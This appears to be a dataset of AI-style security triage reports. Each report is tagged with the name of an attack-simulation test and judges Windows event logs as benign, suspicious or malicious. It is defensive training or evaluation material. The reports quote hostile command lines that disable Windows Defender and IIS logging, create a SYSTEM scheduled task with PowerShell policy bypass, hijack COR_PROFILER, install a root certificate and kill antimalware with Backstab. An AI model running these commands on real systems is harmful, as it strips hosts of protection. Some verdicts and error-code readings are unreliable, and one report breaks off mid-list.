- Without additional indications of compromise, such as known exploit patterns, unusual network activity, or alerts from security tools, these logs lack clear evidence of malicious activity.
- The frequent use of command-line tools and directory operations could warrant a deeper investigation, particularly around the context and source of these scripts, to ensure there is no abuse of administrative scripts or tools.

### Assessment:

Given the available data and analysis:

- **Resolution: BENIGN**
  - Current activities recorded in the logs can reasonably be attributed to non-malicious operations, within the context of typical administrative actions, absent further indication or evidence of compromise.

### Recommendation:

- Maintain vigilant supervision over logs for patterns of misuse or deviation in normal operation.
- Consider reviewing the purposes of the scripts or command-line activities and ensure they align with legitimate operational practices.
- Implement restrictive policies, logging enhancements, and endpoint defenses to mitigate potential risks of misuse in the future."
Lolbin Jsc.exe compile javascript to dll,"After analyzing the provided logs, here's a detailed assessment:

1. **Security Log Analysis:**
   - Multiple Event ID `4624` logs indicate successful logins. The `LogonType` of `5` suggests service account logins which are generally typical for Windows services acting under `SYSTEM` (NT AUTHORITY). These entries appear benign, with no unusual activity, such as logons from unfamiliar accounts or non-standard logon types.
   - Event ID `4672` indicates special privileges were assigned to the `SYSTEM` account, which is expected as `SYSTEM` typically has elevated privileges.
   - Event ID `5379` consistently shows credential validation attempts that failed (with `ReturnCode: 3221226021` - STATUS_NO_SUCH_USER). These validation failures could be indicative of system misconfiguration or unnecessary attempts, but each coincides with a machine-specific account `MicrosoftAccount:user=02txoixylodcstop`, hinting potentially at system misconfiguration rather than malicious behavior.
   - Event ID `4798` denotes attempts to query user attributes by the `Server002$` machine account indicating routine system operations like account enumeration.

2. **Sysmon Log Analysis:**
   - Event IDs related to process creation (`Event ID 1`) show instances where legitimate Windows processes like `wevtutil.exe`, `powershell.exe`, `conhost.exe`, `cmd.exe`, among others, have been executed by a user (`SERVER002\\admin_test`). The processes and command lines observed seem to relate mostly to internal commands and setups, showing no vagrant signs of command execution intended for malicious actions.
   - Of note, `cmd.exe` runs with a command associated with Microsoft .NET (`jsc.exe`) to compile JavaScript library, yet this seems more like a development-related action, not inherently malicious without further context.
   - `HOSTNAME.EXE`, `whoami.exe` executions suggest a system check or environment verification, standard during scripts or setup operations.
   - Microsoft Edge Update operations are visible with `setup.exe` running within restricted system directories. This process relates to browser automation or updates.

3. **Application Log Analysis:**
   - A single Application entry for `Windows Security SPP` and `Windows Defender` indicates normal system operations. No indications of malicious activities are reflected.

**Conclusion and Final Resolution:**

The logs predominately demonstrate standard system operations including process execution for utilities typically used internally aligned with expected services and accounts. There is an absence of evidence that could straightforwardly be interpreted as malicious activities or any immediate threats.

Thus, the overall assessment based on the provided logs is **BENIGN**. No immediate action is warranted, but continued monitoring and verification of any specific configurations that might lead to repeated credential validation errors (Event ID `5379`, specifically) is advisable."
Windows Auto Update Option to Notify before download,"### Detailed Analysis of Logs

#### Security Logs Analysis

1. **Event ID 4616**: Indicates a system time change.
   - **Significance**: Repeated changes in system time could be used to manipulate timestamps of events, potentially hiding malicious activities.
   - Both timestamps are very close, indicating two time adjustments in quick succession. This is unusual and could indicate tampering unless justified by authorized maintenance.

2. **Event ID 4624 and 4672**: Logon types with special privileges for `admin_test`.
   - **Significance**: Logon Type 3 indicates a network logon, which is common. However, the event 4672 shows that `admin_test` is granted a large set of privileges (includes SeDebugPrivilege, SeTakeOwnershipPrivilege), which can be exploited.
   - If this account `admin_test` should not typically log in network-wise or have these privileges, it might indicate an attempt to escalate privileges maliciously.

3. **Event ID 4634**: Logoff event.
   - **Significance**: Could suggest a normal logoff, but should be checked regarding the timing of the logon and activities performed during the session.

#### Sysmon Logs Analysis

1. **Process Creation (Event ID 1)**:
   - Multiple instances of **cmd.exe**, **reg.exe**, and **wevtutil.exe** are executed by `admin_test`. The key activity is making registry changes using command: 
     ```
     reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU"" /v ""AUOptions"" /t REG_DWORD /d 2 /f
     ```
   - **Significance**: This specific registry change can modify Windows Update behaviors, which malicious actors might use to suppress updates thus prevent security patches, fitting a persistence mechanism.

2. **Network Activities**:
   - No suspicious network activity directly inferred from the logs provided.

3. **Uncommon Activities**:
   - **wevtutil.exe** is employed multiple times. Normally used for querying and manipulating event logs, its frequent use could suggest attempts to clear/evaluate logs, which could be malicious.

4. **Interaction with Scheduled Microsoft Updates**:
   - Multiple activities related to Microsoft Edge Update are visible, running under `NT AUTHORITY\SYSTEM`. This seems typical for automated updates processes and doesn't raise a flag here.

#### Application and System Logs

- **Application Log**:
  - Shows entries related to Edge Updates, no explicit suspicious activities noted.
  
- **System Log**:
  - Focuses on time changes with svchost.exe - already assessed in the security log.

### Conclusion and Resolution

**Overall Assessment**: The logs exhibit potentially malicious behavior, particularly around privileges being escalated and registry changes being made to influence system updates—typical indicators of preparation for persistent access or exploitation.

- **Resolution**: **SUSPICIOUS**

### Guidance on How to Proceed
1. **Validation and Logs Review**: Validate with system administrators if there are any authorized changes that could explain the time alterations and registry modifications by `admin_test`.
2. **User Verification**: Verify if `admin_test` activities and permissions are compliant with expected behavior and check recent password changes or attempts.
3. **Integrity Checks**: Conduct an integrity check on critical files and registry settings for unauthorized modifications.
4. **Network Monitoring**: Examine surrounding network traffic and communications for anomalies or exchanges with known malicious IP addresses.
5. **Update Policy Review**: Ensure update policies are not hindered and investigate other systems for similar registry modifications.
6. **Immediate Containment**: If suspicion remains or if malicious activities are confirmed, consider isolating the system to prevent further actions.

By addressing these areas, you can ascertain whether the activity proceeds from legitimate sources or if further security actions are warranted."
Tamper with Windows Defender Evade Scanning -Process,"**Detailed Analysis of Logs**

Upon analyzing the logs from the Windows host, several events stand out as potentially suspicious or indicative of malicious activity. Below is a summary of the suspicious activities discovered across the different log categories:

### 1. **System Log Analysis:**

- **Time Service Events:** These logs indicate that the system's time service is synchronizing with a trusted time source (`time.windows.com`). This is standard behavior, and no anomalies were observed here.

- **Windows Update Events:** Regular updates indicating updates for Microsoft Defender Antivirus were successfully completed. This shows that the Defender updates are functioning as expected, providing an additional layer of security to the system.

### 2. **Sysmon Log Analysis:**

- **Repeated Execution of System Utilities (wevtutil.exe, conhost.exe):** The frequent execution of `wevtutil.exe` and `conhost.exe` by the user ""SERVER002\\admin_test"" does raise suspicion. `wevtutil.exe` is a command-line utility for managing event logs, and frequent automated or batch executions could signify suspicious activity where an attacker might be attempting to clear event logs or perform log management for trace evasion.

- **PowerShell Execution with Exclusion Modifications:** The PowerShell command shows an `Add-MpPreference -ExclusionProcess` for excluding `outlook.exe` from Defender scans. Excluding a specific program (Outlook) from antivirus scans can be a red flag, as it may be an attempt to bypass detection of potentially malicious activity that uses Outlook as a vector.

### 3. **Application Log Analysis:**

- **EdgeUpdate Service Stoppage:** The multiple instances where the `edgeupdate` service was stopped could raise suspicion if the service stoppage is unauthorized or unexpected. However, such stoppage by itself is not inherently malicious without context.

### 4. **PowerShell Log Analysis:**

- **Suspicious PowerShell Activity:** The logs show PowerShell launching with a command set to exclude `outlook.exe` from Defender scans at multiple stages. This is consistent with behaviors indicative of potential attempts to avoid security scans on processes running via Outlook, possibly to evade detection.

### 5. **Security Log Analysis:**

- **Empty Security Logs:** The absence of security logs could be suspicious if expected logs are missing. This could indicate log tampering or clearing, typical techniques used by attackers to hide their activity.

### Assessment and Conclusion:

Considering the evidence gathered, the execution of multiple system processes without corresponding legitimate behavior explanations, and particularly the PowerShell command excluding `outlook.exe`, could be indicative of potentially malicious behavior attempting to bypass security measures.

Furthermore, as there are numerous activities involving system-level utilities and adjustments to security settings without clear legitimate purpose, this warrant closer examination to determine if they represent an insider threat, malicious software activity, or authorized actions.

**Resolution: SUSPICIOUS**

### Recommendations:

1. **Further Investigation:** 
   - Investigate the purpose behind excluding `outlook.exe` and whether it was legitimately configured.
   - Review any associated configurations or scripts that triggered the repeated execution of Sysmon-logged utilities.
   - Confirm with IT personnel if there were legitimate maintenance tasks involved.

2. **Monitoring and Mitigation:**
   - Implement monitoring for future PowerShell and sensitive utility executions.
   - Reinstate and enforce tighter policies regarding process exclusions in security software configurations.
   - Consider escalating for deeper forensic analysis to ensure no further compromised behaviors on the host.

Regularly audit security settings and logs to uncover unauthorized or suspicious activity early and ensure proper endpoint protection measures are continuously updated to counteract evolving threats."
Indirect Command Execution - Scriptrunner.exe,"After reviewing the Windows event logs provided, here is a detailed analysis focusing on potential indicators of malicious activity within the logs:

### Suspicious Activities Identified:
1. **Frequent Execution of System Utilities (wevtutil.exe and conhost.exe):**
   - Multiple instances of `wevtutil.exe` and `conhost.exe` are being executed in quick succession. `wevtutil.exe` is a legitimate Windows utility used for managing event logs, but its misuse can indicate attempts to delete or tamper logs to cover tracks.
   - The consistent use of `admin_test` user for executing these processes raises suspicion about whether this is an automated script or a compromise involving elevated privileges misuse.

2. **PowerShell Execution:**
   - There is an execution of PowerShell with a complex command line involving the application `calc.exe`. While starting Calculator is benign, using PowerShell in this manner can sometimes be indicative of attempts to run scripts or commands with potential for obfuscation or executing malicious code, especially in scenarios simulating other more dangerous activities.

3. **Time Change Events:**
   - There are `EventID: 4616` in the Security logs, indicating system time changes. Malicious actors sometimes attempt to modify system time to disrupt logging or timestamp-based defenses.
   
4. **System Utilities and Services:**
   - The presence of `TiWorker.exe`, `TrustedInstaller.exe`, and other system-level processes operating under the `NT AUTHORITY\SYSTEM` and `NT AUTHORITY\NETWORK SERVICE` contexts is generally normal, but persistent monitoring or hijacking for unauthorized operations could be questionable if analyzed further.
   
5. **Unusual Usage Pattern:**
   - The combination of admin operations, frequent invocation of utilities, and PowerShell scripts seems out of place, especially when observed together within a short timeframe.

### Threat Assessment:

Based on the logs, the activities observed could be part of a legitimate administrative routine where event logs are queried, system utilities are frequently used, and service updates occur. However, the following could raise concerns:
- The use and potential misuse of elevated privileges with the user `admin_test`.
- The frequent invocation of system utilities and the method of PowerShell execution could indicate a reconnaissance or persistence setup by a malicious actor.
- No direct evidence of a compromise like malware signatures, but potential for scripts or operations attempting to hide traces.

### Conclusion:
- **Resolution**: **SUSPICIOUS**

Further investigation is needed to:
- Verify the legitimacy of the `admin_test` user's actions.
- Examine any scripts or automation that may be running unconventionally.
- Ascertain if the modification in time settings aligns with authorized activities.
- Correlate these activities with network logs or any intrusion detection systems for confirming threats if any.

### Guidance:
- Conduct a deeper review of user permissions and recent changes or anomalies on `Server002`
- Monitor any associated network activity or anomalies post these events.
- Log any specific indicators that can trace back to automated or potentially compromised scripts and alert relevant teams.

By taking these actions, the risk of missing potential malicious activity can be minimized."
Creating W32Time similar named service using schtasks,"After analyzing the provided Windows event logs, here's the detailed assessment:

The sequence of events captured from the Sysmon logs indicates a series of process creations and terminations that have a pattern suggesting potentially unauthorized or suspicious activity on the system.

1. **Suspicious Scheduler Execution**: 
   - In the Sysmon logs, there is an event recorded indicating that `schtasks.exe` was executed with the following command line:
     ```
     cmd.exe /c schtasks /create /ru system /sc daily /tr ""cmd /c powershell.exe -ep bypass -file c:\\data.004_NonExistingScript.ps1"" /tn win32times /f & schtasks /query /tn win32times
     ```
   - This command creates a scheduled task that runs a PowerShell script (`c:\\data.004_NonExistingScript.ps1`) with arguments to bypass execution policy, potentially executing an arbitrary script with system privileges. This behavior is often used by adversaries to maintain persistence on a compromised host.

2. **PowerShell Use Not Captured**: 
   - Notably, there is a lack of PowerShell logs presented here, but the attempts to utilize PowerShell with potentially harmful arguments are clear from the command line executions observed in the Sysmon logs.
  
3. **Parent-Child Process Relationships**: 
   - The chain of processes involving `cmd.exe` and `schtasks.exe`, both executed from a high integrity level, points towards possibly malicious activity.
   - The frequent use of `conhost.exe` as observed in the logs seems to be normal as it is part of the `cmd.exe` execution but in this context might be covering malicious task scheduling.

4. **No Malicious Connections Found**: 
   - There are no events indicating network connections typically associated with data exfiltration or command-and-control activities.

5. **Host Updates/Defensive Mechanisms**:
   - The application and system logs note events regarding updates and the state of Windows Defender being operational which suggests the defensive mechanisms on the host are active.

6. **Failed Credential Attempts**:
   - The security logs contain multiple failed credential attempts related to MicrosoftAccount logins with return code `3221226021` (indicating ""Account restrictions are preventing this user from signing in""). This could suggest password spraying attempts or misconfigured services.

Given the creation of a scheduled task with potentially harmful intentions and PowerShell command in bypass mode (a common tactic used by adversaries to facilitate unauthorized scripts), this indicates the possibility of malicious activity.

### Conclusion
Based on the analysis of these logs, I would categorize the situation as:
- **MALICIOUS** 

### Guidance
1. **Immediate Investigation**: Conduct a thorough investigation to determine the presence and impact of the scheduled task (`win32times`) and any execution of unauthorized scripts.
   
2. **Log Review**: Explore additional logs like PowerShell, Task Scheduler, and audit logs for more context on the execution.
   
3. **Defensive Response**: If unauthorized tasks are confirmed, remove them, and consider revoking the permissions of the account used (`SERVER002\\admin_test`) until full root cause analysis is complete.

4. **Continuous Monitoring**: Set up alerts for any similar activities in the future, especially for PowerShell executed with bypass mode or suspicious scheduled tasks."
Abusing MyComputer Disk Fragmentation Path for Persistence,"Based on the provided Windows event logs, here is a detailed analysis of the observed activities:

1. **Frequent Use of System Utilities:** 
   - The logs show repeated executions of `wevtutil.exe`, `conhost.exe`, `hostname.exe`, and `whoami.exe`. While these commands can be part of routine system or administrative tasks, their high frequency and clustering in such a short time might be suspicious.
   - Specifically, `wevtutil.exe` is used to query or alter event logs, and its frequent execution might indicate an attempt to manipulate or delete evidence.

2. **Registry Modification via CMD:**
   - The event showing the command line `""cmd.exe"" /c reg add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MyComputer\DefragPath"" /t REG_EXPAND_SZ /d ""%%systemroot%%\system32\notepad.exe"" /f` is a modification of the system registry which can be used for persistence or exploitation.
   - The modification redirects a system path, potentially indicating malicious intent to intercept or hijack processes.

3. **Privileges & Integrity Levels:**
   - The observed processes are running at high integrity levels with the user `SERVER002\admin_test`, which could mean these activities require elevated privileges, typical for administrative tasks but also leveraged during malicious actions.

4. **Microsoft Edge Update Processes:**
   - The execution of multiple Microsoft Edge Update processes (`MicrosoftEdgeUpdate.exe`) and related components are likely benign as long as these activities are corroborated by a legitimate update schedule and versions.

5. **Time Synchronization:**
   - The logs include events related to time synchronization, a legitimate system activity. However, unsanctioned modifications to system time could be used by malware for stealth.

6. **Security Log:**
   - Only time change events are shown in the Security logs, reflecting the time adjustments made, which is generally benign if it matches with legitimate NTP time synchronization.

**Assessment and Conclusion:**
- The registry modification via CMD and the frequency of utility executions are the most concerning in the logs provided. These actions could be signs of malicious activity, especially the registry changes which can facilitate persistence or privilege escalation.
- The execution of utilities like `hostname.exe` and `whoami.exe`, while not inherently malicious, add to the suspicion when seen with rapid succession and modification attempts.

**Resolution: SUSPICIOUS**
- The activity contained within the logs shows potential signs of malicious behavior that warrants further investigation to confirm any compromise. It would be prudent to verify the authenticity of the registry changes, review update schedules for Edge, and check for other signs of compromise or unauthorized access within the system.
- Proactive steps such as reviewing recent user activity, scrutinizing log files for additional anomalies, and running a full system antivirus/malware scan should be considered."
Execute base64-encoded PowerShell,"Upon analyzing the provided Windows event logs, several activities can be identified that warrant discussion regarding their nature and potential implications. I will break down the behavior observed and assess any risks involved.

### Observations and Analysis:

1. **EdgeUpdate Activity:**
   - Multiple entries involve the process `MicrosoftEdge_X64_130.0.2849.46_129.0.2792.89.exe` located in `C:\Program Files (x86)\Microsoft\EdgeUpdate\Install\`.
   - The logs show legitimate update activities for Microsoft Edge, which is common system behavior when the application checks for or applies updates. No suspicious arguments or paths are observed here that would indicate tampering.

2. **PowerShell Usage:**
   - The PowerShell activity `\""powershell.exe\"" -EncodedCommand` with encoded command parameters occurs. Base64 encoding is utilized in many legitimate and malicious scripts.
   - The command ultimately decodes to: `Write-Host ""Hey, file!""`, which does not indicate malicious activity. However, the use of encoded commands in scripts should generally be evaluated further, although in this instance, the command appears to be benign.

3. **Standard Windows Processes:**
   - Processes such as `wevtutil.exe`, `conhost.exe`, `whoami.exe`, and `svchost.exe` running on the system are normal Windows operations.
   - `wevtutil.exe` is used to manage event logs, and its execution could relate to any maintenance or monitoring scripts.

4. **Security Log Events:**
   - Events related to Microsoft accounts are indicating logon attempts or interactions involving `MicrosoftAccount:user=...`. The `ReturnCode` ""3221226021"" typically means `STATUS_NO_SUCH_LOGON_SESSION`, which might be benign and linked to unmatched operations/service checks.

5. **Privileges on SYSTEM Use:**
   - Multiple instances of `SeDebugPrivilege` and other high-level privileges are observed. These privileges are normal when SYSTEM user contexts spawn or manage services.
   - The SYSTEM account activities logged, including privilege assignments, don't display anything overtly malicious, given typical system tasks can raise these privileges.

### Risk Assessment:
- **Encapsulation of Behavior:** Most behavior encapsulated in these logs corroborates typical operational and administrative functions being performed on a Windows server.
- **Encoded PowerShell Commands:** Despite appearing harmless, encoded PowerShell scripts should be double-checked if not previously verified or recorded as expected activity.
- **Privileges and SYSTEM Usage:** SYSTEM account activities align with standard automated or administrative tasks, but monitoring should remain consistent to flag any unusual patterns.

### Conclusion:
After examining the available log data and processes recorded, there is no definitive indicator of compromise or evidence suggesting malicious activities.

### Resolution:
**BENIGN** - The logs contain benign activities. I recommend routine monitoring to ensure that all activities align with approved and expected tasks on the network, maintaining vigilance over any encoded scripts or unexpected privilege escalations."
User scope COR_PROFILER,"**Analysis:**

Upon analyzing the provided Windows event logs focusing on PowerShell and Sysmon events, I have found several activities that raise concern.

1. **PowerShell Script Execution:**
   - The PowerShell logs indicate the execution of a script that creates registry keys in `HKCU:\Software\Classes\CLSID\{09108e71-974c-4010-89cb-acf471ae9e2c}\InprocServer32` and points to a DLL (`data.012x64.dll`) located in a `Temp` directory.
   - Modifications are made to the user’s environment variables: `COR_ENABLE_PROFILING`, `COR_PROFILER`, and `COR_PROFILER_PATH`.
   - Execution of `eventvwr.msc` via `mmc.exe` is mentioned, which is a known technique to execute commands with elevated privileges by hijacking the Windows Event Viewer.

2. **Sysmon Events:**
   - Sysmon logs confirm the execution of `powershell.exe` with the suspicious command line enumerated above, which matches the PowerShell logs.
   - Execution of `mmc.exe` with `eventvwr.msc` following the PowerShell script matches the technique known as ""Event Viewer"" bypass used to execute payloads in a more concealed manner.
   - The processes are executed by `SERVER002\admin_test`, which could signify an intentional or compromised usage of an administrative account.

3. **Indicators of Obfuscation/Evasion:**
   - Running PowerShell from a Temp directory and the creation of CLSID entries are tactics often used to conceal malicious operations.
   - Hijacking legitimate Windows processes, such as `eventvwr.msc` using `mmc.exe`, suggests an attempt to avoid detection by traditional security tools.

**Assessment:**

The logs provide very strong indicators of potentially malicious activity:
- The modification of registry keys and environment variables aligned with a suspicious DLL indicates an attempt to load malicious code via the .NET runtime.
- The PowerShell script execution involving registry alterations and DLL reference points to potential code injection or backdoor operations.
- Using `eventvwr.msc` suggests an intention for privilege escalation or persistence.

**Resolution: MALICIOUS**

Based on the observable activities, the evidence points to a likely compromise involving advanced persistence and privilege escalation techniques. This event should be treated with high priority for containment and further investigation.

**Guidance:**

1. **Immediate Containment:**
   - Isolate the host to prevent potential lateral movement within the network.
   - Suspend or disable the `SERVER002\admin_test` account until further examination.

2. **Further Investigation:**
   - Analyze the referenced DLL (`data.012x64.dll`) to identify its behavior and intent.
   - Review other systems for similar CLSID registry keys or environment variables changes.
   - Conduct a comprehensive review of logs for unusual logins or other accounts that may be compromised.

3. **Long-term Mitigation:**
   - Assess and enhance endpoint detection and response capabilities to mitigate such techniques.
   - Educate users, especially those with administrative privileges, on recognizing and avoiding phishing and other social engineering tactics that lead to compromise.

Prioritize these actions to address and mitigate the identified threat effectively."
Disable Windows IIS HTTP Logging,"**Analysis of the Windows Event Logs**

Upon reviewing the provided Windows event logs across different logs (Sysmon, Windows PowerShell, Application, Security, and System logs), I have identified the following points:

1. **Process Execution and Command Lines:**
   - **PowerShell Usage:** There is a PowerShell command (`powershell.exe & {C:\Windows\System32\inetsrv\appcmd.exe set config ""Default Web Site"" /section:httplogging /dontLog:true}`) executed with high integrity, which is used to modify settings for HTTP logging. Disabling logging could be indicative of an attempt to conceal actions on the server. This behavior is considered suspicious and warrants further investigation. However, without more context or additional suspicious behavior, this alone doesn't definitively confirm malicious activity.
   - **Legitimate Tools with Normal Parameters:** Several instances of standard Windows processes such as `hostname.exe`, `whoami.exe`, `conhost.exe`, and `wevtutil.exe` are seen with typical command-line parameters. These don't appear unusual or inherently malicious without further context indicating misuse.

2. **System Updates and Scheduled Tasks:**
   - **Microsoft Edge Update Activity:** Substantial activity involving the Microsoft Edge Update processes is documented. The logs show processes like `MicrosoftEdgeUpdate.exe` executing with various parameters like `/svc`, `/regserver`, and `/update`. This behavior aligns with regular update activities for maintaining Microsoft Edge, and no anomalies related to privilege escalation or unexpected modifications were observed.

3. **Security and Sysmon Alerts:**
   - **No Direct Indicators of Compromise (IoC):** The Sysmon logs do not display direct signs of known malicious indicators such as unrecognized or abnormal process trees, suspicious hash values, or known malicious command-line patterns.
   - **Security Logs:** Time synchronization events (`EventID: 4616`) are present, which are common on systems maintaining accurate time with an NTP server. No related malicious manipulations like privilege escalation or unauthorized access were logged.

4. **Overall Behavior:**
   - The presence of `powershell.exe` modifying IIS logging behavior raises a red flag because it might suggest intentions to mask actions for post-compromise operations. However, without additional evidence of actual data exfiltration, lateral movement, or similar, it remains speculative.
   - Most other activities captured seem related to regular updates or system maintenance, and without the presence of additional context or red flags, they appear benign.

**Assessment:**
- **SUSPICIOUS:** The standout event that necessitates a cautious approach is the use of PowerShell to disable logging on the IIS server, as this could potentially be part of a larger malicious effort. While this isn't definitive proof of compromise, it does prompt further scrutiny to ensure no underlying malicious activity is overlooked.

**Guidance on Proceeding:**
- Investigate the context and source of the PowerShell command executing changes to IIS logging settings. Verify if this was an authorized change or potentially indicative of an attempted breach.
- Conduct a review of related systems and configurations, especially focusing on the IIS server’s activities and logs, to find any anomalies.
- Implement or verify the existence of monitoring and alerting around critical system changes, particularly around logging configurations to prevent potential obfuscation attempts during a compromise.

Adopting a proactive and investigative approach at this stage will help ascertain the legitimacy of the identified suspicious activity and ensure the system's integrity is maintained."
DLL Side-Loading using the Notepad++ GUP.exe binary,"Based on the provided Windows event logs, here is the detailed analysis:

### Analysis of Logs:

1. **Sysmon Log Entries:**
   - Multiple processes have been observed being executed. Notably, `powershell.exe`, `wevtutil.exe`, `cmd.exe`, and `gup.exe` were run by the user `SERVER002\admin_test`. The presence of `cmd.exe` running with a specific path to `GUP.exe` located in a temporary folder is noteworthy as it may indicate an attempt to execute a potentially unwanted program or a place that malware uses to hide.

2. **Process Chain:**
   - **Command Execution:** The logs showcase command-line execution via `cmd.exe` aimed at running `GUP.exe` found in a temporary directory. The use of temporary directories and unconventional locations to execute binary files can be considered suspicious.
   - **WinGup for Notepad++:** The log shows `GUP.exe` having a description related to Notepad++. If this is expected behavior on the server, then it may be benign. However, if the execution of `GUP.exe` from a temporary directory is unexpected, it warrants further investigation.

3. **Updates and Scheduled Tasks:**
   - Numerous entries involve `MicrosoftEdgeUpdate.exe` operations that appear to be related to the automatic update mechanism of browsers, which is typical behavior.

4. **Process ID and User Correlation:**
   - The Sysmon logs indicate that several high-integrity-level processes were executed under the user `SERVER002\admin_test`, which may be typical, depending on the user's role. However, any unexpected high privilege execution should be reviewed, especially given the direct execution from temporary folders.

### Assessment:

- **Suspicious Activity**:
  - The execution of `C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.002\bin\GUP.exe` raises a flag. Although `GUP.exe` is related to the update system of Notepad++, its presence and execution from a temporary directory could be exploited in a typical attack scenario (e.g., a trojan disguises itself as a legitimate updater).

### Conclusion:

- Based on the behavior noted, this activity leans towards the category of **SUSPICIOUS**. Although there's no direct evidence of malicious activity given the association of `GUP.exe` with Notepad++, any executions originating from temporary directories, especially when combined with `cmd.exe` scripting, demand scrutiny. While there is no definitive malicious evidence, there are enough anomalies that warrant further investigation.

### Recommended Actions:

1. **Verify User Intent**: Confirm with the user `admin_test` if the installation or update involving `GUP.exe` was legitimate and expected.
2. **Examine File Integrity**: Check the SHA256 hash of `GUP.exe` against known signatures to ascertain its legitimacy.
3. **Review System Hardening**: Ensure system protections against potentially unwanted programs (PUP) and that antivirus/antimalware tools are running with up-to-date definitions.
4. **Continued Monitoring**: Continue to monitor for similar activities, especially those stemming from temporary directories or atypical execution paths.

Further forensic investigation is warranted to decisively determine if there was a compromise."
Disable Windows Defender with PwSh Disable-WindowsOptionalFeature,"Based on the analysis of the provided logs, here are the key findings and assessments:

1. **PowerShell Activity**:
   - The PowerShell logs indicate usage of commands to disable Windows Defender features:
     - `Disable-WindowsOptionalFeature -Online -FeatureName ""Windows-Defender-Gui"" -NoRestart -ErrorAction Ignore`
     - `Disable-WindowsOptionalFeature -Online -FeatureName ""Windows-Defender-Features"" -NoRestart -ErrorAction Ignore`
     - `Disable-WindowsOptionalFeature -Online -FeatureName ""Windows-Defender"" -NoRestart -ErrorAction Ignore`
     - Such actions are typically suspicious as they attempt to disable security features on the host and could indicate an attempt to evade detection.

2. **Sysmon Logs**:
   - There is frequent execution of system utilities such as `wevtutil.exe`, `conhost.exe`, and `dismhost.exe` by the user `admin_test`. While these are legitimate Windows processes, their usage in conjunction with PowerShell executing commands to disable Windows Defender is concerning.
   - `PowerShell.exe` also executed commands found disabling security features. The parent process relationships and user execution consistency suggest targeted operations possibly aiming to circumvent security measures.

3. **Other Application and System Activities**:
   - There are no significant anomalies in the application logs concerning the Microsoft Edge updates. They appear routine and consistent with legitimate software update behavior.

**Assessment**:
The presence of PowerShell commands disabling Windows Defender features and the usage of legitimate system tools like `dismhost.exe`, `wevtutil.exe`, etc., can be an indication of malicious activity, particularly if executed by a non-administrator or unexpected user like 'admin_test'. This activity pattern fits tactics often used by adversaries trying to establish persistence or lateral movement while disabling security features to avoid detection.

**Threat Level and Resolution**:
- **Resolution**: MALICIOUS
- **Rationale**: The logs contain evidence of actions attempting to disable core security features of the system, which is a strong indicator of malicious intent.
  
**Guidance**:

- Consider isolating the host from the network until a full assessment is completed to prevent further possible malicious activity."
Install root CA on Windows,"Upon analysis of the provided logs, there are several observations that can be made regarding potential indicators of suspicious or anomalous behavior.

### Analysis of Logs

1. **Security Log Events:**
   - Event ID 4624 indicates a successful logon with LogonType 5, which typically represents a service startup. The logons by the `SYSTEM` account and process `services.exe` under `LogonType 5` are expected for Windows service operations and do not indicate suspicious activity on their own.
   - Event ID 4672 indicates special privilege assignment to the `SYSTEM` account. The privileges include `SeDebugPrivilege` among others, which are standard for the `SYSTEM` account.
   - Event ID 5379 logs indicate credential operations involving a Microsoft Account and show a `ReturnCode` of `3221226021`, which indicates `STATUS_NO_TRUST_SAM_ACCOUNT`. This suggests failed attempts to interact with credential stores which could be benign, but recurring failures might merit further analysis to ensure no misconfigurations are present.
   
2. **Sysmon Log Events:**
   - Numerous Sysmon Event ID 1 (Process Creation) and Event ID 5 (Process Termination) events are documented indicating procedures like `powershell.exe`, `wevtutil.exe`, and `conhost.exe` being executed by `admin_test`. Of particular note, there are PowerShell executions that indicate an attempt to import a certificate and manipulate certificate store paths:
     - Example CommandLine: `""powershell.exe"" & {$cert = Import-Certificate -FilePath rootCA.cer -CertStoreLocation Cert:\LocalMachine\My, Move-Item -Path $cert.PSPath -Destination \\\""\""Cert:\LocalMachine\\Root\\\""\""}`
   - The use of PowerShell with commands to manipulate certificate stores could indicate a potential attempt to install an unauthorized root certificate. This kind of behavior necessitates investigation.
   
3. **Windows PowerShell Log Events:**
   - The logs include PowerShell instance (Event ID 600) indicating operations involving certificate provider, which align with the Sysmon logs regarding certificate imports.
   - Event ID 400 signals the PowerShell engine is in a 'Started' state and 403 shows it transitioning to a 'Stopped' state, likely due to the completion of the PowerShell script execution.

4. **Other Observations:**
   - The Windows Application log does not show any particular entries signaling errors or suspicious activity, such as software crashes or other anomalies related to unauthorized installations or operations.

### Assessment

- There are no definitive indicators of compromise based upon standard Windows service operations, logons, and assignments of special privileges to `SYSTEM`.
- Recurring failed attempts related to MicrosoftAccount operations warrant checking for possible misconfigurations or unauthorized access attempts.
- The PowerShell activity, specifically the importing of certificates, stands out as suspicious. While this could be legitimate administrative activity, it could also suggest an adversary trying to add a malicious root certificate.

### Conclusion

Considering the logs presented and the potential security implications, the resolution for this investigation is:

- **SUSPICIOUS**

### Recommendations for Further Action

1. **Investigate Certificate Actions:**
   - Verify the origin and purpose of the certificate being imported. Ensure that there's legitimate business justification for such activity.

2. **Review Access and Permission Logs:**
   - Conduct a thorough review of any changes in privileges or access from the `admin_test` account.
   
3. **Microsoft Account Evaluations:**
   - Investigate the failed credential operations involving Microsoft accounts to ensure there is no ongoing unauthorized access attempt.

4. **Increase Monitoring:**
   - Implement deeper logging and monitoring of PowerShell activities, especially focusing on any further manipulations of the certificate store or system configurations.

Kill antimalware protected processes using Backstab,"Based on the provided Windows event logs, here's my detailed analysis:

### Suspicious or Anomalous Behavior:

1. **PowerShell Execution:**
   - At `2024-10-28 09:13:34.793`, a suspicious instance of PowerShell is executed with a command line that includes executing `Backstab64.exe` from a Temp directory. The execution path is: `powershell.exe & {& ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\Backstab64.exe"" -k -n MsMpEng.exe}`. This behavior appears suspicious because it involves executing a potentially malicious executable stored in a user’s temporary file path.

2. **Use of `wevtutil.exe`:**
   - The process `C:\\Windows\\System32\\wevtutil.exe` is executed multiple times by the user `SERVER002\\admin_test`. The `wevtutil.exe` command is typically used for managing event logs on a Windows system. Multiple and frequent invocations within such a short time span could suggest an attempt to manipulate or clear event logs, which is a known tactic used by attackers to cover their tracks.

3. **Execution of `whoami.exe` and `hostname.exe`:**
   - Commands like `whoami.exe` and `hostname.exe` are often used by scripts or threat actors to gather system information. While benign in isolation, they can be indicative of enumeration activities when juxtaposed with other suspicious activities.

4. **High Integrity Level Execution:**
   - The PowerShell and other key processes are executed with high integrity levels, which may indicate administrative privileges are being utilized, which makes potentially malicious actions more impactful.

5. **Frequent Execution of Microsoft Edge Update:**
